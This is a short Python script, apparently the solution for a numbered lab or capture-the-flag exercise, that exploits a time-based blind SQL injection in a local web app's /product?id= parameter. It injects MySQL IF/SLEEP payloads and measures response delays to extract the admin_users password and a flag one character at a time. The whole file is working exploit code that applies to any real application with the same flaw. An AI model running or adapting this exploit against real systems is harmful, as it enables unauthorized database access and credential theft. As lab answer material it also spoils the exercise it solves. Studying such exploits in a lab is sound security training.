#!/usr/bin/env python3
"""SQLi-029: MySQL Time-based Blind Exploit"""
import requests
import time
import string

BASE_URL = "http://localhost:5029"
CHARSET = string.ascii_letters + string.digits + "_{}"
DELAY = 2

def check(condition):
    start = time.time()
    payload = f"1 AND IF({condition},SLEEP({DELAY}),0)-- -"
    requests.get(f"{BASE_URL}/product?id={requests.utils.quote(payload)}", timeout=30)
    return time.time() - start > DELAY - 0.5

def extract(table, column, max_len=50):
    result = ""
    for pos in range(1, max_len + 1):
        found = False
        for c in CHARSET:
            cond = f"SUBSTRING((SELECT {column} FROM {table} LIMIT 1),{pos},1)='{c}'"
            if check(cond):
                result += c
                print(f"[+] {column}: {result}")
                found = True
                break
        if not found:
            break
    return result

def main():
    print("SQLi-029: MySQL Time-based Blind Exploit")
    print("=" * 45)
    extract("admin_users", "password")
    flag = extract("flags", "value")
    print(f"\n[+] FLAG: {flag}")

if __name__ == "__main__":
    main()
